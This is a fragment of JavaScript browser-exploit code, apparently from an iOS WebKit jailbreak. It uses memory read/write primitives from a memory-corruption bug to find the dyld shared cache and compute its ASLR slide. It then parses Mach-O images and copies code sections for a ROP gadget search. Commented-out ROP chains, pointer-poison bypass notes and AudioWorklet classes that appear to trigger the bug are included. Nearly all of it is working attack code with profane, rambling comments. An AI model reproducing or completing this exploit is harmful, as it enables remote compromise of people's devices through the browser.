        /*FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...*/
        if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
        //webcore header magic...
        {
            print1(String.fromCharCode(...memory.read(hdr, 0x10)))
            break;
        }
        hdr = Sub(hdr, 0x1000);
        }
        
        function ab2str(buf) {
  return String.fromCharCode.apply(null, new Uint16Array(buf));
}
        //alert('Mach-O magic' + hex(memory.read(hdr,0x36)))
        var base_seg = null;
        //alert("nsegs test" + memory.u32(hdr+0x18))
        var nsegs    = memory.u32(Add(hdr, 0x14));
        print1(nsegs + "nsegs")
       // alert(memory.u32(hdr + 0x18) + "segment"+ nsegs*0x20 + "sets")
       //mapping cache
        
        
        var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
        var segs     = [];
        for(var z = 0; z < nsegs; ++z)
        {
            var off = z * 0x20;
            var seg =
            {
            /*segname: String.fromCharCode(new Int64(segdata.slice(off - 0x00, off - 0x16))),*/
            addr:     new Int64(segdata.slice(off +  0x0, off +  0x8)),
            size:     new Int64(segdata.slice(off +  0x8, off + 0x10)),
            fileoff:  new Int64(segdata.slice(off + 0x10, off + 0x18)),
            maxprot:  b2u32(segdata.slice(off + 0x18, off + 0x1c)),
            initprot: b2u32(segdata.slice(off + 0x1c, off + 0x20)),
            max_rights: "",
            init_rights: ""
            };
            segs.push(seg);
            //var max_rights = "";
            //var init_rights = "";
            if(seg.maxprot & VM_PROT_NONE){
                seg.max_rights += "-";
            }
            if(seg.maxprot & VM_PROT_READ) {
                seg.max_rights += "r";
            }
            if(seg.maxprot & VM_PROT_WRITE) {
                seg.max_rights += "w";
            }
            if(seg.maxprot & VM_PROT_EXECUTE){
                seg.max_rights += "x";
            }
            if(seg.initprot & VM_PROT_NONE){
                seg.init_rights += "-";
            }
            if(seg.initprot & VM_PROT_READ) {
                seg.init_rights += "r";
            }
            if(seg.initprot & VM_PROT_WRITE) {
                seg.init_rights += "w";
            }
            if(seg.initprot & VM_PROT_EXECUTE){
                seg.init_rights += "x";
            }
            if(seg.max_rights.length < 4){
                seg.max_rights = "-" + seg.max_rights;
            }
            if(seg.init_rights.length < 4){
                seg.init_rights = "-" + seg.init_rights;
            }
           
            //memory.read_i32(
            if(seg.fileoff.hi() == 0 && seg.fileoff.lo() == 0 && (seg.size.hi() != 0 || seg.size.lo() != 0))
                        {
                            base_seg = seg;
                        }
        }
        if(base_seg == null)
        {
            fail("base_seg");
        }
        var cache_slide = Sub(hdr, base_seg.addr);
        
        //alert("cache slide" + cache_slide + "vs" + nslide);
        //base_seg.addr = Add(base_seg.addr, cache_slide
        
        for(var i = 0; i < segs.length; ++i)
        {
            var cachesize = 0;
            cachesize = Add(segs[i].size,cachesize);
            segs[i].addr = Add(segs[i].addr, cache_slide);
            print1("DYLD Shared cache segment ("+segs[i].addr.toString(16)+"-"+Add(segs[i].addr, segs[i].size).toString(16)+"): "+segs[i].init_rights+"/"+segs[i].max_rights);
        }
        //alert("cache size is : " + cachesize);
        //alert("dyld base address" + memory.u32(hdr + 0x20))
        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18))); //88 = C style
        // dylibs = &cache[header->imagesoffset()]
        //alert("imgs"+imgs)
        //walkingimages
        var nimgs = memory.u32(Add(hdr, 0x1C)); //correct
        var imgdata = memory.read(Add(hdr, memory.u32(Add(hdr,0x18))), nimgs * 0x20);
        var imgsarr = [];
        for (var q = 0; q < nimgs; ++q) {
            var imgoff = q * 0x20;
            /*struct dyld_cache_image_info
            {
                uint64_t    address; //0-0x08
                uint64_t    modTime; // 8-0x10
                uint64_t    inode; // 10-0x18
                uint32_t    pathFileOffset; //18-0x1C
                uint32_t    pad; //1c-0x20
            };*/
            var img1 = {
                addr: new Int64(imgdata.slice(imgoff + 0x0, imgoff + 0x8)),
                modTime: new Int64(imgdata.slice(imgoff + 0x8, imgoff + 0x10)),
                inode: new Int64(imgdata.slice(imgoff + 0x10, imgoff + 0x18)),
                pathFileOffset: b2u32(imgdata.slice(imgoff + 0x18, imgoff + 0x1c)),
                pad: b2u32(imgdata.slice(imgoff + 0x18, imgoff + 0x1c))
            };
            
            imgsarr.push(img1);
            //these
        }
        /*struct dyld_cache_header
        {
            char        magic[16];                // e.g. "dyld_v0    i386" 0-0x10
            uint32_t    mappingOffset;            // file offset to first dyld_cache_mapping_info 10-0x14
            uint32_t    mappingCount;            // number of dyld_cache_mapping_info entries 14-0x18
            uint32_t    imagesOffset;            // file offset to first dyld_cache_image_info 18-0x1C
            uint32_t    imagesCount;            // number of dyld_cache_image_info entries 1c-0x20
            uint64_t    dyldBaseAddress;        // base address of dyld when cache was built 20-0x24
            //28?
            uint64_t    codeSignatureOffset;    // file offset of code signature blob //0x30
            uint64_t    codeSignatureSize;        // size of code signature blob (zero means to end of file) //0x38
            uint64_t    slideInfoOffset;        // file offset of kernel slid info 0x40
            uint64_t    slideInfoSize;            // size of kernel slid info 0x48
            uint64_t    localSymbolsOffset;        // file offset of where local symbols are stored
            //0x50
            uint64_t    localSymbolsSize; //0x58       // size of local symbols information
            uint8_t        uuid[16]; // 0x60                // unique value for each shared cache file
            uint64_t    cacheType;         //0x68      // 1 for development, 0 for optimized
        };*/
        for (var i = 0; i < imgsarr.length; ++i) { //header->imageCount();
            //imgsarr[i].addr = Add(imgsarr[i].addr,cache_slide);
            imgsarr[i].addr = Add(cache_slide, imgsarr[i].addr);
            imgsarr[i].addr1 = Add(hdr, imgsarr[i].pathFileOffset);
            //const char* dylibPath = (char*)cache + dylibs[i].pathFileOffset() //lolz 24 hours wasted
            // when i simply just need to pass the original img.addr to mappedaddress()
            //imgsarr[i].straddr = String.fromCharCode(...memory.read(mappedAddress(segs,imgsarr[i].addr1),0x60))
            imgsarr[i].name = String.fromCharCode(...memory.read(imgsarr[i].addr1,0x60))
            //imgsarr[i].addr1 = Sub(hdr, imgsarr[i].pathFileOffset);
            var [name,...garbage] = imgsarr[i].name.split(""");
            imgsarr[i].name = name;
            //alert1("lib : " + imgsarr[i].name + "@" + imgsarr[i].addr);
            alert1(" lib # " + (i + 1) + " : " + imgsarr[i].name + " @ " + imgsarr[i].addr);
            //imgsarr points to dylibs aka "images"
            var machheader = dec2hex(memory.u32(imgsarr[i].addr));
            //alert("debug:machheader-" + machheader)
            
            //base is supposed to be the mach-o header form of the lib we're in!
            /* struct mach_header_64 {
                uint32_t    magic;        / mach magic number identifier /
                cpu_type_t    cputype;    / cpu specifier /
                cpu_subtype_t    cpusubtype;    / machine specifier /
                uint32_t    filetype;    / type of file /
                uint32_t    ncmds;        / number of load commands /
                uint32_t    sizeofcmds;    / the size of all the load commands /
                uint32_t    flags;        / flags /
                uint32_t    reserved;    / reserved /
            };*/
            
                var machoff = 0x0 //i * 0x20;
                var machHeaders = [];
                var machheaderdata = memory.read(imgsarr[i].addr,0x20);
                var machHeader = {
                    magic: b2u32(machheaderdata.slice(machoff + 0x0, machoff + 0x4)),
                    cputype: b2u32(machheaderdata.slice(machoff + 0x4, machoff + 0x8)),
                    cpusubtype: b2u32(machheaderdata.slice(machoff + 0x8, machoff + 0xc)),
                    filetype: b2u32(machheaderdata.slice(machoff + 0xc, machoff + 0x10)),
                    ncmds: b2u32(machheaderdata.slice(machoff + 0x10, machoff + 0x14)),
                    sizeofcmds: b2u32(machheaderdata.slice(machoff + 0x14, machoff + 0x18)),
                    flags: b2u32(machheaderdata.slice(machoff + 0x18, machoff + 0x1c)),
                    reserved: b2u32(machheaderdata.slice(machoff + 0x1c, machoff + 0x20))
                };
                
                machHeaders.push(machHeader);

            alert1("magic" + dec2hex(machHeader.magic));
            alert("ncmds" + machHeader.ncmds);
            
            //noInline(exponentiate);
            
            /*opcodes = {
                            // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
                            "ldrx8":       [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0],
                            // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
                            "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
                            // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
                            "regloader":   [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ],
                            // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
                            // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
                            "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
                            // mov x4, x20 ; blr x8
                            "movx4":       [ 0xaa1403e4, 0xd63f0100 ],
                            // ldr x0, [x0] -- for debugging
                            "ldrx0x0":     [ 0xf9400000 ],
                        };*/ //opcodes for the instructions we want to perform ROP or JOP or JROP...
            //came back 2 days later to write my own ROP Gadgets ;)
            //one dylib to ROP them all... "/usr/lib/PN548.dylib"
            //memory.writeInt64(exe_ptr,0x0,Add(0x1883c0d4c,cache_slide))
            //d.addEventListener('click', function(){})
            //writeInt64 is defined as (where,offset,what)
            //right now according to my crash print1s when we do a memory write
            // we control registers : x20 which points to where... exception is the higher bits are 0xffff
            //also x1 and x5 through our float64array spray earlier so the register values will be x1 && x5 = 0x0000000000001337;
            // I dont know much about the bug itself or the register controlled from this exploit style
            // but its safe to assume there is some weird r/w limitation either we have
            // relative r/w or arbitrary read and relative writes ? it's safe to assume that we can read any arbitrary 64 bit value but the high bitmask is 0xffff when writing so maybe we can read 64 bit values but limited to writing 32 bit values... which if that is the case as long as we aren't limited to 8 byte values we should still be fine i guess but time to test that theory!!!
            // coming back after changing the value from 1337 of register x1 and x5 to 4141 ... so can we only write limited 16 bytes? if so still good to go green.
            
            //proceeding on i found some perfect rop gadgets
            //0x19d537bc4 f3 03 05 aa     mov        x19,x5 //now x19 will point to x5 making it equal 0x4141
            //0x19d537bd4 f5 03 01 aa     mov        x21,x1 //now x21 also points to same value
            //now we control
            //0x19d537bdc e0 03 00 91     mov        x0,sp //with the sp pointing to x0 ill use x0
            // to serve as an arbitrary function call in the cache setting  registers 1-7 to be its args
            //      19d537d88 f4 4f 48 a9     ldp        x20,x19,[sp, #local_20]
            //      19d537d8c f6 57 47 a9     ldp        x22,x21,[sp, #local_30]
            //      19d537d90 f8 5f 46 a9     ldp        x24,x23,[sp, #local_40]
            //      19d537d94 fa 67 45 a9     ldp        x26,x25,[sp, #local_50]
            //      19d537d98 ff 83 02 91     add        sp,sp,#0xa0
            //      19d537d9c c0 03 5f d6     ret
            // the above will be my stackloader...
            //var ropchain = [0x19d537bc4,0x19d537bd4,0x19d52fba4,0x19d537d88,0x19d537d8c,0x19d537d90,0x19d537d94,0x19d537d98,0x19d537d9c};
            //ropchainbuffaddr = addrof(ropchain) + 0x18==;
            /*for (var dd = 0; dd < ropchain.length; ++dd) {
                
                ropchain[dd] = Add(ropchain[2],cache_slide);
                alert("ropchain addr:" + ropchainbuffaddr)
                memory.writeInt64(v_tlb,ropchainbuffaddr)
                wrapper.addEventListener('click', function(){})
            }*/
            
            /*function xor(a, b) {
                var res = 0, base = 1
                for (var i = 0; i < 64; ++i) {
                    res += base * ((a&1) ^ (b&1))
                    a = (a-(a&1))/2
                    b = (b-(b&1))/2
                    base *= 2
                }
                return res
            }
            
            var workbuf = new ArrayBuffer(0x1000000)
            var u32_buffer = new Uint32Array(workbuf)
            var u8_buffer = new Uint8Array(workbuf)
            var shellcode_length*/
            /*#if ENABLE(POISON)
                 232    // FIXME: once we have C++17, we can make this a lambda in makeConstExprPoison().
                 233    inline constexpr uintptr_t constExprPoisonRandom(uintptr_t seed)
                 234    {
                 235        uintptr_t result1 = seed * 6906969069 + 1234567;
                 236        uintptr_t result2 = seed * 8253729 + 2396403;
                 237        return (result1 << 3) ^ (result2 << 16);
                 238    }
                 239    #endif
                 240
            230    241    inline constexpr uintptr_t makeConstExprPoison(uint32_t key)
            231    242    {
            232    243    #if ENABLE(POISON)
            233             uintptr_t uintptrKey = key;
            234             uintptr_t poison1 = uintptrKey * 6906969069 + 1234567;
            235             uintptr_t poison2 = uintptrKey * 8253729 + 2396403;
            236             uintptr_t poison = (poison1 << 3) ^ (poison2 << 16);
                 244        uintptr_t poison = constExprPoisonRandom(key);
            237    245        poison &= ~(static_cast<uintptr_t>(0xffff) << 48); // Ensure that poisoned bits look like a pointer.
            238    246        poison |= (1 << 2); // Ensure that poisoned bits cannot be 0.
             */
            /*_g_JSArrayBufferPoison                          XREF[1]:     Entry Point(*)
1b85481a0                 ??         ??
1b85481a1                 ??         ??
1b85481a2                 ??         ??
1b85481a3                 ??         ??
1b85481a4                 ??         ??
1b85481a5                 ??         ??
1b85481a6                 ??         ??
1b85481a7                 ??         ??*/
            //var g_typedArrayPoisons = Add(0x1b85481a0,cache_slide)
            //alert("typed array poison:" + g_typedArrayPoisons);
            //var key =
            //var poison = memory.read_i64(g_typedArrayPoisons);
            //var key = ()
            //alert("poison" + poison)
            // leak backing store from an ArrayBuffer.
            //var buffer_addr = xor(memory.read_i64(addrof(u32_buffer)),poison);
            //alert("arraybufferbacking addr:" + buffer_addr);
            //var shellcode_src = buffer_addr + 0x4000
            



            
            
            var syms = {};
            var gadgets = {};
            var opcodes = {};
            for(var j = 0, off1 = 0x20; j < machHeader.ncmds; ++j) {
                var base = imgsarr[i].addr;
                var cmd = memory.u32(Add(base,off1))
                var LC_SEGMENT = String.fromCharCode(...memory.read(Add(base, off1 + 0x8), 0x10));
                LC_SEGMENT = "\"" + LC_SEGMENT + "\"" ;
                if (dec2hex(cmd) == 0x00000019 && LC_SEGMENT.localeCompare("__TEXT") == 1) {
                    //alert("whoosh are successfully parsing the shared cache!!! Jailbreak 40% Complete")
                    var nsects = memory.u32(Add(base, off1 + 0x40));
                    var o1;
                    for (var k = 0, o1 = off1 + 0x48; k < nsects; ++k) {
                        var LC_SECTION = String.fromCharCode(...memory.read(Add(base, o1), 0x10))
                        LC_SECTION ="\"" + LC_SECTION + "\"" ;
                        if(LC_SECTION.localeCompare("__text") == 1) {
                            var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])
                            if (keys.length == 0) {
                                fail("opcodes length = 0");
                            }
                            var match = {};
                            for(var z = 0; z < keys.length; ++z) {
                                match[keys[z]] = 0;
                            }
                            /*struct section_64 { / for 64-bit architectures /
                                char        sectname[16];    / name of this section / 0x0 - 0x10
                                char        segname[16];    / segment this section goes in / 0x10 - 0x20
                                uint64_t    addr;        / memory address of this section / 0x20 - 0x28
                                uint64_t    size;        / size in bytes of this section / 0x28 - 0x30
                                uint32_t    offset;        / file offset of this section / 0x30 - 0x34
                                uint32_t    align;        / section alignment (power of 2) / 0x34 - 0x38
                                uint32_t    reloff;        / file offset of relocation entries / 0x38 - 0x3c
                                uint32_t    nreloc;        / number of relocation entries / 0x3c - 0x40
                                uint32_t    flags;        / flags (section type and attributes)/ 0x40 - 0x44
                                uint32_t    reserved1;    / reserved (for offset or index) / 0x44 - 0x48
                                uint32_t    reserved2;    / reserved (for count or sizeof) / 0x48 - 0x4c
                                uint32_t    reserved3;    / reserved / 0x4c - 0x50
                            };*/
                            /*var section64arr = [];
                            var sectiondata = memory.read(Add(base, o1),0x50);
                            var ssection_64 = {
                                sectname: b2u32(sectiondata.slice(0x0, 0x10)),
                                segname: b2u32(sectiondata.slice(0x10, 0x20)),
                                addr: new Int64(b2u32(sectiondata.slice(0x20, 0x28))),
                                size: new Int64(b2u32(sectiondata.slice(0x28, 0x30))),
                                offset: b2u32(sectiondata.slice(0x30, 0x34)),
                                align: b2u32(sectiondata.slice(0x34, 0x38)),
                                reloff: b2u32(sectiondata.slice(0x38, 0x3c)),
                                nreloc: b2u32(sectiondata.slice(0x3c, 0x40)),
                                flags: b2u32(sectiondata.slice(0x40, 0x44)),
                                reserved1: b2u32(sectiondata.slice(0x44, 0x48)),
                                reserved2: b2u32(sectiondata.slice(0x48, 0x4c)),
                                reserved3: b2u32(sectiondata.slice(0x4c, 0x50))
                            };*/ //this block works mapping ssection_64 to parse the section but i don't need it so i'm just going to leave this here just in case i need to use it in the future plus its an annoyance because ssection_64.addr is missing the and extra 0x1 in front of the last 8 hex numbers example is addr = 0x00000001984cba7c but ssection_64.addr is spitting 0x00000000984cba7c why i have no clue so instead of fixing it i'll just leave it be already spent over a year decoding and trying to understand totally not spyware and have spent 2 weeks studying dyld's dyld_shared_cache_iterator.c to be able to code this cache parser in pure javascript im exhausted!!! so kudos... maybe i could just removed the "new Int64" wrapper and just put dec2hex() wrapping around it but im too lazy maybe another day.
                            
                            section64arr.push(ssection_64);

                            var addr = Add(memory.readInt64(Add(base, o1 + 0x20)), cache_slide)
                            var size = memory.readInt64(Add(base, o1 + 0x28))
                            //alert("section_64 address:" + addr + "vs " + Add(ssection_64.addr, cache_slide));
                            
                            // Copy the entire __text region into a Uint32Array for faster processing.
                            // Previously you could map a Uint32Array over the data, but on i7+ devices
                            // this caused access violations.
                            // Instead we read the entire region and copy it into a Uint32Array. The
                            // memory.read primitive has a weird limitation where it's only able to read
                            // up to 4096 bytes. to get around this we'll read multiple times and combine
                            // them into one.

                            var allData = new Uint32Array(size / 4)
                            for (var r = 0; r < size; r += 4096) {
                            // Check to ensure we don't read out of the region we want
                            var qty = 4096
                            if (size - r < qty) {
                                qty = size - r
                            }
                            var data = memory.read(Add(addr, r), qty)

                            // Data is an array of single bytes. This code takes four entries
                            // and converts them into a single 32-bit integer. It then adds it
                            // into the `allData` array at the given index
                            for (var h = 0; h < qty; h += 4) {
                                var fourBytes = b2u32(data.slice(h, h + 4))
                                allData[(r + h) / 4] = fourBytes
                                }
                            }
                            print1("[+] Have successfully mapped the cache into a uint32array");
                            print1("[+] only thing left to do is do a gadget search...")
                            //gadget finder code goes here.....

                            
                        }
                    }
                }
            }
            //maybe add another }?
    }
    //  sleep(2000);
    return true;
}
class OrigineWorklet extends AudioWorkletProcessor {
    constructor(){
        super();
        //var fuck2 = new AudioWorkletProcessor();
        return b;
    }
    static get parameterDescriptors() {
        return []
    }
    process (inputs, outputs, parameters) {
        
        return false;
    }
}
class OrigineWorklet2 extends AudioWorkletProcessor {
    constructor(){
        super();
        //console.log(c);
        this.port.onmessage = (e)=>{
        }
        
        fuck = this;
        //fuck.port.postMessage(c);
        return this;
    }
    static get parameterDescriptors() {
        return [{
            name: 'param2',
            defaultValue: 0.1337
        }];
    }
    process (inputs, outputs, parameters) {
        //
        //
        //this.port.postMessage(c);
        return false;
    }
}
registerProcessor('OrigineWorklet', OrigineWorklet);
registerProcessor('OrigineWorklet2', OrigineWorklet2);
